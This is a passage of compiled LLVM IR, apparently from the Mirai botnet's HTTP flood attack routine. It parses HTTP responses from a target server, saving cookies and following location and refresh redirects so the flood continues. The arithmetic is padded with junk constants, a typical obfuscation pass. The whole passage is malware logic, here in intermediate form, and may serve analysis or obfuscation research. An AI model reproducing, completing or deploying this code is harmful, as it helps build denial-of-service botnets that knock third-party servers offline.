  %1413 = call i32 @util_stristr(i8* %1410, i32 %1411, i8* %1412)
  %1414 = icmp ne i32 %1413, -1
  br i1 %1414, label %1415, label %1420

; <label>:1415:                                   ; preds = %1406
  %1416 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1416, i32 0, i32 15
  %1418 = load i32, i32* %1417, align 4
  %1419 = icmp slt i32 %1418, 5
  br label %1420

; <label>:1420:                                   ; preds = %1415, %1406
  %1421 = phi i1 [ false, %1406 ], [ %1419, %1415 ]
  br i1 %1421, label %1422, label %1629

; <label>:1422:                                   ; preds = %1420
  %1423 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1424 = load i32, i32* %37, align 4
  %1425 = sext i32 %1424 to i64
  %1426 = getelementptr inbounds i8, i8* %1423, i64 %1425
  %1427 = load i32, i32* %12, align 4
  %1428 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1429 = call i32 @util_stristr(i8* %1426, i32 %1427, i8* %1428)
  store i32 %1429, i32* %47, align 4
  %1430 = load i32, i32* %37, align 4
  %1431 = load i32, i32* %47, align 4
  %1432 = sub i32 0, %1431
  %1433 = sub i32 %1430, %1432
  %1434 = add nsw i32 %1430, %1431
  %1435 = sext i32 %1433 to i64
  %1436 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1435
  %1437 = load i8, i8* %1436, align 1
  %1438 = sext i8 %1437 to i32
  %1439 = icmp eq i32 %1438, 32
  br i1 %1439, label %1440, label %1446

; <label>:1440:                                   ; preds = %1422
  %1441 = load i32, i32* %47, align 4
  %1442 = add i32 %1441, 1081556559
  %1443 = add i32 %1442, 1
  %1444 = sub i32 %1443, 1081556559
  %1445 = add nsw i32 %1441, 1
  store i32 %1444, i32* %47, align 4
  br label %1446

; <label>:1446:                                   ; preds = %1440, %1422
  %1447 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1448 = load i32, i32* %37, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds i8, i8* %1447, i64 %1449
  %1451 = load i32, i32* %47, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds i8, i8* %1450, i64 %1452
  %1454 = load i32, i32* %12, align 4
  %1455 = load i32, i32* %37, align 4
  %1456 = sub i32 %1454, -1846912186
  %1457 = sub i32 %1456, %1455
  %1458 = add i32 %1457, -1846912186
  %1459 = sub nsw i32 %1454, %1455
  %1460 = load i32, i32* %47, align 4
  %1461 = sub i32 %1458, 1026606702
  %1462 = sub i32 %1461, %1460
  %1463 = add i32 %1462, 1026606702
  %1464 = sub nsw i32 %1458, %1460
  %1465 = call i32 @util_memsearch(i8* %1453, i32 %1463, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1465, i32* %48, align 4
  %1466 = load i32, i32* %48, align 4
  %1467 = icmp ne i32 %1466, -1
  br i1 %1467, label %1468, label %1622

; <label>:1468:                                   ; preds = %1446
  %1469 = load i32, i32* %37, align 4
  %1470 = load i32, i32* %47, align 4
  %1471 = sub i32 %1469, -1846634878
  %1472 = add i32 %1471, %1470
  %1473 = add i32 %1472, -1846634878
  %1474 = add nsw i32 %1469, %1470
  %1475 = sext i32 %1473 to i64
  %1476 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1475
  store i8* %1476, i8** %49, align 8
  %1477 = load i32, i32* %48, align 4
  %1478 = icmp sge i32 %1477, 2
  br i1 %1478, label %1479, label %1484

; <label>:1479:                                   ; preds = %1468
  %1480 = load i32, i32* %48, align 4
  %1481 = sub i32 0, 2
  %1482 = add i32 %1480, %1481
  %1483 = sub nsw i32 %1480, 2
  store i32 %1482, i32* %48, align 4
  br label %1484

; <label>:1484:                                   ; preds = %1479, %1468
  %1485 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1486 = load i32, i32* %37, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds i8, i8* %1485, i64 %1487
  %1489 = load i32, i32* %47, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds i8, i8* %1488, i64 %1490
  %1492 = load i32, i32* %12, align 4
  %1493 = load i32, i32* %37, align 4
  %1494 = sub i32 0, %1493
  %1495 = add i32 %1492, %1494
  %1496 = sub nsw i32 %1492, %1493
  %1497 = load i32, i32* %47, align 4
  %1498 = sub i32 0, %1497
  %1499 = add i32 %1495, %1498
  %1500 = sub nsw i32 %1495, %1497
  %1501 = call i32 @util_memsearch(i8* %1491, i32 %1499, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1502 = icmp sgt i32 %1501, 0
  br i1 %1502, label %1503, label %1526

; <label>:1503:                                   ; preds = %1484
  %1504 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1505 = load i32, i32* %37, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds i8, i8* %1504, i64 %1506
  %1508 = load i32, i32* %47, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds i8, i8* %1507, i64 %1509
  %1511 = load i32, i32* %12, align 4
  %1512 = load i32, i32* %37, align 4
  %1513 = add i32 %1511, -568715896
  %1514 = sub i32 %1513, %1512
  %1515 = sub i32 %1514, -568715896
  %1516 = sub nsw i32 %1511, %1512
  %1517 = load i32, i32* %47, align 4
  %1518 = sub i32 0, %1517
  %1519 = add i32 %1515, %1518
  %1520 = sub nsw i32 %1515, %1517
  %1521 = call i32 @util_memsearch(i8* %1510, i32 %1519, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1522 = sub i32 %1521, 296654312
  %1523 = sub i32 %1522, 1
  %1524 = add i32 %1523, 296654312
  %1525 = sub nsw i32 %1521, 1
  store i32 %1524, i32* %48, align 4
  br label %1526

; <label>:1526:                                   ; preds = %1503, %1484
  %1527 = load i32, i32* %37, align 4
  %1528 = load i32, i32* %47, align 4
  %1529 = add i32 %1527, 182991503
  %1530 = add i32 %1529, %1528
  %1531 = sub i32 %1530, 182991503
  %1532 = add nsw i32 %1527, %1528
  %1533 = load i32, i32* %48, align 4
  %1534 = sub i32 0, %1533
  %1535 = sub i32 %1531, %1534
  %1536 = add nsw i32 %1531, %1533
  %1537 = sext i32 %1535 to i64
  %1538 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1537
  store i8 0, i8* %1538, align 1
  store i32 0, i32* %10, align 4
  br label %1539

; <label>:1539:                                   ; preds = %1554, %1526
  %1540 = load i32, i32* %10, align 4
  %1541 = load i8*, i8** %49, align 8
  %1542 = call i32 @util_strlen(i8* %1541)
  %1543 = icmp slt i32 %1540, %1542
  br i1 %1543, label %1544, label %1560

; <label>:1544:                                   ; preds = %1539
  %1545 = load i8*, i8** %49, align 8
  %1546 = load i32, i32* %10, align 4
  %1547 = sext i32 %1546 to i64
  %1548 = getelementptr inbounds i8, i8* %1545, i64 %1547
  %1549 = load i8, i8* %1548, align 1
  %1550 = sext i8 %1549 to i32
  %1551 = icmp eq i32 %1550, 61
  br i1 %1551, label %1552, label %1553

; <label>:1552:                                   ; preds = %1544
  br label %1560

; <label>:1553:                                   ; preds = %1544
  br label %1554

; <label>:1554:                                   ; preds = %1553
  %1555 = load i32, i32* %10, align 4
  %1556 = add i32 %1555, -1691106982
  %1557 = add i32 %1556, 1
  %1558 = sub i32 %1557, -1691106982
  %1559 = add nsw i32 %1555, 1
  store i32 %1558, i32* %10, align 4
  br label %1539

; <label>:1560:                                   ; preds = %1552, %1539
  %1561 = load i8*, i8** %49, align 8
  %1562 = load i32, i32* %10, align 4
  %1563 = sext i32 %1562 to i64
  %1564 = getelementptr inbounds i8, i8* %1561, i64 %1563
  %1565 = load i8, i8* %1564, align 1
  %1566 = sext i8 %1565 to i32
  %1567 = icmp eq i32 %1566, 61
  br i1 %1567, label %1568, label %1621

; <label>:1568:                                   ; preds = %1560
  %1569 = load i32, i32* %10, align 4
  store i32 %1569, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1570

; <label>:1570:                                   ; preds = %1589, %1568
  %1571 = load i32, i32* %10, align 4
  %1572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1572, i32 0, i32 15
  %1574 = load i32, i32* %1573, align 4
  %1575 = icmp slt i32 %1571, %1574
  br i1 %1575, label %1576, label %1594

; <label>:1576:                                   ; preds = %1570
  %1577 = load i8*, i8** %49, align 8
  %1578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1578, i32 0, i32 16
  %1580 = load i32, i32* %10, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1579, i64 0, i64 %1581
  %1583 = getelementptr inbounds [128 x i8], [128 x i8]* %1582, i32 0, i32 0
  %1584 = load i32, i32* %50, align 4
  %1585 = call signext i8 @util_strncmp(i8* %1577, i8* %1583, i32 %1584)
  %1586 = icmp ne i8 %1585, 0
  br i1 %1586, label %1587, label %1588

; <label>:1587:                                   ; preds = %1576
  store i32 1, i32* %51, align 4
  br label %1594

; <label>:1588:                                   ; preds = %1576
  br label %1589

; <label>:1589:                                   ; preds = %1588
  %1590 = load i32, i32* %10, align 4
  %1591 = sub i32 0, 1
  %1592 = sub i32 %1590, %1591
  %1593 = add nsw i32 %1590, 1
  store i32 %1592, i32* %10, align 4
  br label %1570

; <label>:1594:                                   ; preds = %1587, %1570
  %1595 = load i32, i32* %51, align 4
  %1596 = icmp ne i32 %1595, 0
  br i1 %1596, label %1620, label %1597

; <label>:1597:                                   ; preds = %1594
  %1598 = load i8*, i8** %49, align 8
  %1599 = call i32 @util_strlen(i8* %1598)
  %1600 = icmp slt i32 %1599, 128
  br i1 %1600, label %1601, label %1619

; <label>:1601:                                   ; preds = %1597
  %1602 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1603 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1602, i32 0, i32 16
  %1604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1604, i32 0, i32 15
  %1606 = load i32, i32* %1605, align 4
  %1607 = sext i32 %1606 to i64
  %1608 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1603, i64 0, i64 %1607
  %1609 = getelementptr inbounds [128 x i8], [128 x i8]* %1608, i32 0, i32 0
  %1610 = load i8*, i8** %49, align 8
  %1611 = call i32 @util_strcpy(i8* %1609, i8* %1610)
  %1612 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1613 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1612, i32 0, i32 15
  %1614 = load i32, i32* %1613, align 4
  %1615 = sub i32 %1614, 1048268517
  %1616 = add i32 %1615, 1
  %1617 = add i32 %1616, 1048268517
  %1618 = add nsw i32 %1614, 1
  store i32 %1617, i32* %1613, align 4
  br label %1619

; <label>:1619:                                   ; preds = %1601, %1597
  br label %1620

; <label>:1620:                                   ; preds = %1619, %1594
  br label %1621

; <label>:1621:                                   ; preds = %1620, %1560
  br label %1622

; <label>:1622:                                   ; preds = %1621, %1446
  %1623 = load i32, i32* %47, align 4
  %1624 = load i32, i32* %37, align 4
  %1625 = add i32 %1624, 294699728
  %1626 = add i32 %1625, %1623
  %1627 = sub i32 %1626, 294699728
  %1628 = add nsw i32 %1624, %1623
  store i32 %1627, i32* %37, align 4
  br label %1406

; <label>:1629:                                   ; preds = %1420
  %1630 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1631 = load i32, i32* %12, align 4
  %1632 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1633 = call i32 @util_stristr(i8* %1630, i32 %1631, i8* %1632)
  %1634 = icmp ne i32 %1633, -1
  br i1 %1634, label %1635, label %1856

; <label>:1635:                                   ; preds = %1629
  %1636 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1637 = load i32, i32* %12, align 4
  %1638 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1639 = call i32 @util_stristr(i8* %1636, i32 %1637, i8* %1638)
  store i32 %1639, i32* %52, align 4
  %1640 = load i32, i32* %52, align 4
  %1641 = sext i32 %1640 to i64
  %1642 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1641
  %1643 = load i8, i8* %1642, align 1
  %1644 = sext i8 %1643 to i32
  %1645 = icmp eq i32 %1644, 32
  br i1 %1645, label %1646, label %1652

; <label>:1646:                                   ; preds = %1635
  %1647 = load i32, i32* %52, align 4
  %1648 = add i32 %1647, 555630777
  %1649 = add i32 %1648, 1
  %1650 = sub i32 %1649, 555630777
  %1651 = add nsw i32 %1647, 1
  store i32 %1650, i32* %52, align 4
  br label %1652

; <label>:1652:                                   ; preds = %1646, %1635
  %1653 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1654 = load i32, i32* %52, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds i8, i8* %1653, i64 %1655
  %1657 = load i32, i32* %12, align 4
  %1658 = load i32, i32* %52, align 4
  %1659 = sub i32 %1657, -883236921
  %1660 = sub i32 %1659, %1658
  %1661 = add i32 %1660, -883236921
  %1662 = sub nsw i32 %1657, %1658
  %1663 = call i32 @util_memsearch(i8* %1656, i32 %1661, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1663, i32* %53, align 4
  %1664 = load i32, i32* %53, align 4
  %1665 = icmp ne i32 %1664, -1
  br i1 %1665, label %1666, label %1855

; <label>:1666:                                   ; preds = %1652
  %1667 = load i32, i32* %52, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1668
  store i8* %1669, i8** %54, align 8
  %1670 = load i32, i32* %53, align 4
  %1671 = icmp sge i32 %1670, 2
  br i1 %1671, label %1672, label %1677

; <label>:1672:                                   ; preds = %1666
  %1673 = load i32, i32* %53, align 4
  %1674 = sub i32 0, 2
  %1675 = add i32 %1673, %1674
  %1676 = sub nsw i32 %1673, 2
  store i32 %1675, i32* %53, align 4
  br label %1677

; <label>:1677:                                   ; preds = %1672, %1666
  %1678 = load i32, i32* %52, align 4
  %1679 = load i32, i32* %53, align 4
  %1680 = sub i32 0, %1678
  %1681 = sub i32 0, %1679
  %1682 = add i32 %1680, %1681
  %1683 = sub i32 0, %1682
  %1684 = add nsw i32 %1678, %1679
  %1685 = sext i32 %1683 to i64
  %1686 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1685
  store i8 0, i8* %1686, align 1
  %1687 = load i32, i32* %53, align 4
  %1688 = sub i32 0, 1
  %1689 = sub i32 %1687, %1688
  %1690 = add nsw i32 %1687, 1
  store i32 %1689, i32* %53, align 4
  %1691 = load i8*, i8** %54, align 8
  %1692 = load i32, i32* %53, align 4
  %1693 = call i32 @util_memsearch(i8* %1691, i32 %1692, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1694 = icmp eq i32 %1693, 4
  br i1 %1694, label %1695, label %1804

; <label>:1695:                                   ; preds = %1677
  store i32 7, i32* %10, align 4
  %1696 = load i8*, i8** %54, align 8
  %1697 = getelementptr inbounds i8, i8* %1696, i64 4
  %1698 = load i8, i8* %1697, align 1
  %1699 = sext i8 %1698 to i32
  %1700 = icmp eq i32 %1699, 115
  br i1 %1700, label %1701, label %1708

; <label>:1701:                                   ; preds = %1695
  %1702 = load i32, i32* %10, align 4
  %1703 = sub i32 0, %1702
  %1704 = sub i32 0, 1
  %1705 = add i32 %1703, %1704
  %1706 = sub i32 0, %1705
  %1707 = add nsw i32 %1702, 1
  store i32 %1706, i32* %10, align 4
  br label %1708

; <label>:1708:                                   ; preds = %1701, %1695
  %1709 = load i8*, i8** %54, align 8
  %1710 = load i8*, i8** %54, align 8
  %1711 = load i32, i32* %10, align 4
  %1712 = sext i32 %1711 to i64
  %1713 = getelementptr inbounds i8, i8* %1710, i64 %1712
  %1714 = load i32, i32* %53, align 4
  %1715 = load i32, i32* %10, align 4
  %1716 = sub i32 0, %1715
  %1717 = add i32 %1714, %1716
  %1718 = sub nsw i32 %1714, %1715
  %1719 = sext i32 %1717 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1709, i8* %1713, i64 %1719, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1720

; <label>:1720:                                   ; preds = %1741, %1708
  %1721 = load i8*, i8** %54, align 8
  %1722 = load i32, i32* %10, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds i8, i8* %1721, i64 %1723
  %1725 = load i8, i8* %1724, align 1
  %1726 = sext i8 %1725 to i32
  %1727 = icmp ne i32 %1726, 0
  br i1 %1727, label %1728, label %1747

; <label>:1728:                                   ; preds = %1720
  %1729 = load i8*, i8** %54, align 8
  %1730 = load i32, i32* %10, align 4
  %1731 = sext i32 %1730 to i64
  %1732 = getelementptr inbounds i8, i8* %1729, i64 %1731
  %1733 = load i8, i8* %1732, align 1
  %1734 = sext i8 %1733 to i32
  %1735 = icmp eq i32 %1734, 47
  br i1 %1735, label %1736, label %1741

; <label>:1736:                                   ; preds = %1728
  %1737 = load i8*, i8** %54, align 8
  %1738 = load i32, i32* %10, align 4
  %1739 = sext i32 %1738 to i64
  %1740 = getelementptr inbounds i8, i8* %1737, i64 %1739
  store i8 0, i8* %1740, align 1
  br label %1747

; <label>:1741:                                   ; preds = %1728
  %1742 = load i32, i32* %10, align 4
  %1743 = sub i32 %1742, -1060396003
  %1744 = add i32 %1743, 1
  %1745 = add i32 %1744, -1060396003
  %1746 = add nsw i32 %1742, 1
  store i32 %1745, i32* %10, align 4
  br label %1720

; <label>:1747:                                   ; preds = %1736, %1720
  %1748 = load i8*, i8** %54, align 8
  %1749 = call i32 @util_strlen(i8* %1748)
  %1750 = icmp sgt i32 %1749, 0
  br i1 %1750, label %1751, label %1761

; <label>:1751:                                   ; preds = %1747
  %1752 = load i8*, i8** %54, align 8
  %1753 = call i32 @util_strlen(i8* %1752)
  %1754 = icmp slt i32 %1753, 128
  br i1 %1754, label %1755, label %1761

; <label>:1755:                                   ; preds = %1751
  %1756 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1757 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1756, i32 0, i32 7
  %1758 = getelementptr inbounds [129 x i8], [129 x i8]* %1757, i32 0, i32 0
  %1759 = load i8*, i8** %54, align 8
  %1760 = call i32 @util_strcpy(i8* %1758, i8* %1759)
  br label %1761

; <label>:1761:                                   ; preds = %1755, %1751, %1747
  %1762 = load i8*, i8** %54, align 8
  %1763 = load i32, i32* %10, align 4
  %1764 = sub i32 %1763, -863385295
  %1765 = add i32 %1764, 1
  %1766 = add i32 %1765, -863385295
  %1767 = add nsw i32 %1763, 1
  %1768 = sext i32 %1766 to i64
  %1769 = getelementptr inbounds i8, i8* %1762, i64 %1768
  %1770 = call i32 @util_strlen(i8* %1769)
  %1771 = icmp slt i32 %1770, 256
  br i1 %1771, label %1772, label %1803

; <label>:1772:                                   ; preds = %1761
  %1773 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1774 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1773, i32 0, i32 6
  %1775 = getelementptr inbounds [257 x i8], [257 x i8]* %1774, i32 0, i32 0
  %1776 = getelementptr inbounds i8, i8* %1775, i64 1
  call void @util_zero(i8* %1776, i32 255)
  %1777 = load i8*, i8** %54, align 8
  %1778 = load i32, i32* %10, align 4
  %1779 = sub i32 0, %1778
  %1780 = sub i32 0, 1
  %1781 = add i32 %1779, %1780
  %1782 = sub i32 0, %1781
  %1783 = add nsw i32 %1778, 1
  %1784 = sext i32 %1782 to i64
  %1785 = getelementptr inbounds i8, i8* %1777, i64 %1784
  %1786 = call i32 @util_strlen(i8* %1785)
  %1787 = icmp sgt i32 %1786, 0
  br i1 %1787, label %1788, label %1802

; <label>:1788:                                   ; preds = %1772
  %1789 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1790 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1789, i32 0, i32 6
  %1791 = getelementptr inbounds [257 x i8], [257 x i8]* %1790, i32 0, i32 0
  %1792 = getelementptr inbounds i8, i8* %1791, i64 1
  %1793 = load i8*, i8** %54, align 8
  %1794 = load i32, i32* %10, align 4
  %1795 = sub i32 %1794, 76115728
  %1796 = add i32 %1795, 1
  %1797 = add i32 %1796, 76115728
  %1798 = add nsw i32 %1794, 1
  %1799 = sext i32 %1797 to i64
  %1800 = getelementptr inbounds i8, i8* %1793, i64 %1799
  %1801 = call i32 @util_strcpy(i8* %1792, i8* %1800)
  br label %1802

; <label>:1802:                                   ; preds = %1788, %1772
  br label %1803

; <label>:1803:                                   ; preds = %1802, %1761
  br label %1852

; <label>:1804:                                   ; preds = %1677
  %1805 = load i8*, i8** %54, align 8
  %1806 = getelementptr inbounds i8, i8* %1805, i64 0
  %1807 = load i8, i8* %1806, align 1
  %1808 = sext i8 %1807 to i32
  %1809 = icmp eq i32 %1808, 47
  br i1 %1809, label %1810, label %1851

; <label>:1810:                                   ; preds = %1804
  %1811 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1812 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1811, i32 0, i32 6
  %1813 = getelementptr inbounds [257 x i8], [257 x i8]* %1812, i32 0, i32 0
  %1814 = getelementptr inbounds i8, i8* %1813, i64 1
  call void @util_zero(i8* %1814, i32 255)
  %1815 = load i8*, i8** %54, align 8
  %1816 = load i32, i32* %10, align 4
  %1817 = add i32 %1816, -500359065
  %1818 = add i32 %1817, 1
  %1819 = sub i32 %1818, -500359065
  %1820 = add nsw i32 %1816, 1
  %1821 = sext i32 %1819 to i64
  %1822 = getelementptr inbounds i8, i8* %1815, i64 %1821
  %1823 = call i32 @util_strlen(i8* %1822)
  %1824 = icmp sgt i32 %1823, 0
  br i1 %1824, label %1825, label %1850

; <label>:1825:                                   ; preds = %1810
  %1826 = load i8*, i8** %54, align 8
  %1827 = load i32, i32* %10, align 4
  %1828 = add i32 %1827, 587240818
  %1829 = add i32 %1828, 1
  %1830 = sub i32 %1829, 587240818
  %1831 = add nsw i32 %1827, 1
  %1832 = sext i32 %1830 to i64
  %1833 = getelementptr inbounds i8, i8* %1826, i64 %1832
  %1834 = call i32 @util_strlen(i8* %1833)
  %1835 = icmp slt i32 %1834, 256
  br i1 %1835, label %1836, label %1850

; <label>:1836:                                   ; preds = %1825
  %1837 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1837, i32 0, i32 6
  %1839 = getelementptr inbounds [257 x i8], [257 x i8]* %1838, i32 0, i32 0
  %1840 = getelementptr inbounds i8, i8* %1839, i64 1
  %1841 = load i8*, i8** %54, align 8
  %1842 = load i32, i32* %10, align 4
  %1843 = add i32 %1842, -123216039
  %1844 = add i32 %1843, 1
  %1845 = sub i32 %1844, -123216039
  %1846 = add nsw i32 %1842, 1
  %1847 = sext i32 %1845 to i64
  %1848 = getelementptr inbounds i8, i8* %1841, i64 %1847
  %1849 = call i32 @util_strcpy(i8* %1840, i8* %1848)
  br label %1850

; <label>:1850:                                   ; preds = %1836, %1825, %1810
  br label %1851

; <label>:1851:                                   ; preds = %1850, %1804
  br label %1852

; <label>:1852:                                   ; preds = %1851, %1803
  %1853 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1853, i32 0, i32 1
  store i8 1, i8* %1854, align 4
  br label %2782

; <label>:1855:                                   ; preds = %1652
  br label %1856

; <label>:1856:                                   ; preds = %1855, %1629
  %1857 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1858 = load i32, i32* %12, align 4
  %1859 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1860 = call i32 @util_stristr(i8* %1857, i32 %1858, i8* %1859)
  %1861 = icmp ne i32 %1860, -1
  br i1 %1861, label %1862, label %2257

; <label>:1862:                                   ; preds = %1856
  %1863 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1864 = load i32, i32* %12, align 4
  %1865 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1866 = call i32 @util_stristr(i8* %1863, i32 %1864, i8* %1865)
  store i32 %1866, i32* %55, align 4
  %1867 = load i32, i32* %55, align 4
  %1868 = sext i32 %1867 to i64
  %1869 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1868
  %1870 = load i8, i8* %1869, align 1
  %1871 = sext i8 %1870 to i32
  %1872 = icmp eq i32 %1871, 32
  br i1 %1872, label %1873, label %1879

; <label>:1873:                                   ; preds = %1862
  %1874 = load i32, i32* %55, align 4
  %1875 = add i32 %1874, 2067418485
  %1876 = add i32 %1875, 1
  %1877 = sub i32 %1876, 2067418485
  %1878 = add nsw i32 %1874, 1
  store i32 %1877, i32* %55, align 4
  br label %1879

; <label>:1879:                                   ; preds = %1873, %1862
  %1880 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1881 = load i32, i32* %55, align 4
  %1882 = sext i32 %1881 to i64
  %1883 = getelementptr inbounds i8, i8* %1880, i64 %1882
  %1884 = load i32, i32* %12, align 4
  %1885 = load i32, i32* %55, align 4
  %1886 = sub i32 %1884, -523150112
  %1887 = sub i32 %1886, %1885
  %1888 = add i32 %1887, -523150112
  %1889 = sub nsw i32 %1884, %1885
  %1890 = call i32 @util_memsearch(i8* %1883, i32 %1888, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1890, i32* %56, align 4
  %1891 = load i32, i32* %56, align 4
  %1892 = icmp ne i32 %1891, -1
  br i1 %1892, label %1893, label %2256

; <label>:1893:                                   ; preds = %1879
  %1894 = load i32, i32* %55, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1895
  store i8* %1896, i8** %57, align 8
  %1897 = load i32, i32* %56, align 4
  %1898 = icmp sge i32 %1897, 2
  br i1 %1898, label %1899, label %1905

; <label>:1899:                                   ; preds = %1893
  %1900 = load i32, i32* %56, align 4
  %1901 = sub i32 %1900, -1370676840
  %1902 = sub i32 %1901, 2
  %1903 = add i32 %1902, -1370676840
  %1904 = sub nsw i32 %1900, 2
  store i32 %1903, i32* %56, align 4
  br label %1905

; <label>:1905:                                   ; preds = %1899, %1893
  %1906 = load i32, i32* %55, align 4
  %1907 = load i32, i32* %56, align 4
  %1908 = sub i32 %1906, -30651131
  %1909 = add i32 %1908, %1907
  %1910 = add i32 %1909, -30651131
  %1911 = add nsw i32 %1906, %1907
  %1912 = sext i32 %1910 to i64
  %1913 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1912
  store i8 0, i8* %1913, align 1
  %1914 = load i32, i32* %56, align 4
  %1915 = add i32 %1914, -1994676973
  %1916 = add i32 %1915, 1
  %1917 = sub i32 %1916, -1994676973
  %1918 = add nsw i32 %1914, 1
  store i32 %1917, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1919

; <label>:1919:                                   ; preds = %1945, %1905
  %1920 = load i8*, i8** %57, align 8
  %1921 = load i32, i32* %10, align 4
  %1922 = sext i32 %1921 to i64
  %1923 = getelementptr inbounds i8, i8* %1920, i64 %1922
  %1924 = load i8, i8* %1923, align 1
  %1925 = sext i8 %1924 to i32
  %1926 = icmp ne i32 %1925, 0
  br i1 %1926, label %1927, label %1943

; <label>:1927:                                   ; preds = %1919
  %1928 = load i8*, i8** %57, align 8
  %1929 = load i32, i32* %10, align 4
  %1930 = sext i32 %1929 to i64
  %1931 = getelementptr inbounds i8, i8* %1928, i64 %1930
  %1932 = load i8, i8* %1931, align 1
  %1933 = sext i8 %1932 to i32
  %1934 = icmp sge i32 %1933, 48
  br i1 %1934, label %1935, label %1943

; <label>:1935:                                   ; preds = %1927
  %1936 = load i8*, i8** %57, align 8
  %1937 = load i32, i32* %10, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds i8, i8* %1936, i64 %1938
  %1940 = load i8, i8* %1939, align 1
  %1941 = sext i8 %1940 to i32
  %1942 = icmp sle i32 %1941, 57
  br label %1943

; <label>:1943:                                   ; preds = %1935, %1927, %1919
  %1944 = phi i1 [ false, %1927 ], [ false, %1919 ], [ %1942, %1935 ]
  br i1 %1944, label %1945, label %1951

; <label>:1945:                                   ; preds = %1943
  %1946 = load i32, i32* %10, align 4
  %1947 = add i32 %1946, 1853104093
  %1948 = add i32 %1947, 1
  %1949 = sub i32 %1948, 1853104093
  %1950 = add nsw i32 %1946, 1
  store i32 %1949, i32* %10, align 4
  br label %1919

; <label>:1951:                                   ; preds = %1943
  %1952 = load i8*, i8** %57, align 8
  %1953 = load i32, i32* %10, align 4
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds i8, i8* %1952, i64 %1954
